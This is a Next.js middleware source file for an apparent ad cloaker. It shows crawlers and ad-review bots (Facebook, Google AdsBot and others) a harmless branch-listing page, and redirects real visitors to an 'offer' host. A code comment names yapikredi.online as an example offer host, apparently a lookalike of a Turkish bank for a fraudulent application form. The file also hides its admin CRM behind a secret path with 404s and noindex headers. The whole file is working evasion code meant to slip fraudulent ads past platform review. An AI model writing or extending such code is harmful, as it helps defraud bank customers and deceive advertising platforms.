import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";
import { isAdminHost, isCrmPath } from "@/lib/admin-host";
import { getCrmSecretPath, isCrmSecretPath } from "@/lib/crm-path";
import {
  checkCloak,
  isCloakTestIp,
  OFFER_COOKIE,
  offerPassCookieOptions,
  whiteRedirectTarget,
} from "@/lib/cloaker";
import {
  buildOfferHostUrl,
  hasAdClickInUrl,
  isAdPoolHost,
  isOfferHost,
  isTrustedOfferArrival,
} from "@/lib/offer-host";
import { createOfferPassToken, OFFER_PASS_PARAM } from "@/lib/offer-pass";

const CRAWLER_UA =
  /facebookexternalhit|Facebot|Meta-ExternalAgent|meta-externalagent|LinkedInBot|Twitterbot|Googlebot|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|ia_archiver|Pinterestbot|AdsBot-Google/i;

const CLOAK_HEADER = "x-cloak-page";
const NOINDEX_HEADER = "noindex, nofollow, noarchive, nosnippet";
const CRM_ENTRY_COOKIE = "crm_entry_ok";

function bypass(pathname: string): boolean {
  return (
    pathname.startsWith("/api") ||
    pathname.startsWith("/_next") ||
    pathname.startsWith("/assets") ||
    pathname === "/robots.txt" ||
    pathname === "/subeler.html" ||
    pathname === "/subeler" ||
    pathname === "/basvuru.html" ||
    pathname.endsWith(".svg") ||
    pathname.endsWith(".png") ||
    pathname.endsWith(".json") ||
    pathname.endsWith(".ttf") ||
    pathname.endsWith(".woff") ||
    pathname.endsWith(".woff2")
  );
}

function secureCookie(request: NextRequest): boolean {
  return (
    request.nextUrl.protocol === "https:" ||
    request.headers.get("x-forwarded-proto") === "https"
  );
}

function nextWithCloak(
  request: NextRequest,
  page: "offer" | "white",
  setOfferCookie: boolean
): NextResponse {
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set(CLOAK_HEADER, page);

  const response = NextResponse.next({
    request: { headers: requestHeaders },
  });

  if (setOfferCookie) {
    response.cookies.set(
      OFFER_COOKIE,
      "1",
      offerPassCookieOptions(secureCookie(request))
    );
  } else {
    response.cookies.delete(OFFER_COOKIE);
  }

  return response;
}

export async function middleware(request: NextRequest) {
  const ua = request.headers.get("user-agent") ?? "";
  const { pathname } = request.nextUrl;
  const host = request.headers.get("host");

  if (isCrmSecretPath(pathname)) {
    if (!isAdminHost(host)) {
      return new NextResponse(null, { status: 404 });
    }

    const crmPagePath = "/kapi-8v4n2q9x-mg71";
    const target = request.nextUrl.clone();
    const sameAsCrmPage = pathname === crmPagePath || pathname === crmPagePath + "/";

    if (!sameAsCrmPage) {
      target.pathname = crmPagePath;
    }

    const response = sameAsCrmPage
      ? NextResponse.next()
      : NextResponse.rewrite(target);
    response.headers.set("X-Robots-Tag", NOINDEX_HEADER);
    response.cookies.set(CRM_ENTRY_COOKIE, "1", {
      httpOnly: true,
      sameSite: "strict",
      secure: secureCookie(request),
      path: "/",
      maxAge: 60 * 60 * 6,
    });
    return response;
  }

  if (pathname === "/crm" || pathname.startsWith("/crm/")) {
    return new NextResponse(null, {
      status: 404,
      headers: { "X-Robots-Tag": NOINDEX_HEADER },
    });
  }

  if (pathname.startsWith("/api/crm")) {
    if (!isAdminHost(host) || request.cookies.get(CRM_ENTRY_COOKIE)?.value !== "1") {
      return new NextResponse(null, {
        status: 404,
        headers: { "X-Robots-Tag": NOINDEX_HEADER },
      });
    }

    const response = NextResponse.next();
    response.headers.set("X-Robots-Tag", NOINDEX_HEADER);
    return response;
  }

  if (isCrmPath(pathname) && !isAdminHost(host)) {
    return new NextResponse(null, { status: 404 });
  }

  if (isAdminHost(host) && isCrmPath(pathname)) {
    const response = NextResponse.next();
    response.headers.set("X-Robots-Tag", NOINDEX_HEADER);
    if (!request.cookies.has(CRM_ENTRY_COOKIE)) {
      response.cookies.set(CRM_ENTRY_COOKIE, "1", {
        httpOnly: true,
        sameSite: "strict",
        secure: secureCookie(request),
        path: "/",
        maxAge: 60 * 60 * 6,
      });
    }
    return response;
  }

  if (isAdminHost(host) && !isAdPoolHost(host)) {
    if (pathname === "/" || pathname === "") {
      return NextResponse.redirect(new URL(getCrmSecretPath(), request.url), 302);
    }
    return NextResponse.next();
  }

  if (bypass(pathname)) {
    return NextResponse.next();
  }

  // Reklam domainleri birbirine yönlendirilmez.
  // Her entry domain kendi hostunda cloaker'dan geçer; offer kararı çıkarsa
  // sadece CRM'de ayarlı form/offer hostuna (örn. yapikredi.online) yönlenir.

  if (CRAWLER_UA.test(ua)) {
    return NextResponse.rewrite(new URL("/subeler.html", request.url));
  }

  if (request.cookies.get(OFFER_COOKIE)?.value === "1") {
    return nextWithCloak(request, "offer", false);
  }

  if (isCloakTestIp(request)) {
    return nextWithCloak(request, "offer", true);
  }

  const onOfferHost = await isOfferHost(host);

  if (onOfferHost && (await isTrustedOfferArrival(request))) {
    const op = request.nextUrl.searchParams.get(OFFER_PASS_PARAM);
    if (op) {
      const clean = request.nextUrl.clone();
      clean.searchParams.delete(OFFER_PASS_PARAM);
      const response = NextResponse.redirect(clean, 302);
      response.cookies.set(
        OFFER_COOKIE,
        "1",
        offerPassCookieOptions(secureCookie(request))
      );
      return response;
    }
    return nextWithCloak(request, "offer", true);
  }

  if (onOfferHost) {
    return NextResponse.rewrite(new URL("/subeler.html", request.url));
  }

  const cloak = await checkCloak(request);
  if (cloak?.page === "white") {
    return NextResponse.rewrite(new URL(whiteRedirectTarget(request, cloak.redirectUrl)));
  }

  const offerUrl = await buildOfferHostUrl(request);
  if (!hasAdClickInUrl(offerUrl)) {
    offerUrl.searchParams.set(OFFER_PASS_PARAM, await createOfferPassToken());
  }
  const redirect = NextResponse.redirect(offerUrl, 302);
  return redirect;
}

export const config = {
  matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"],
};
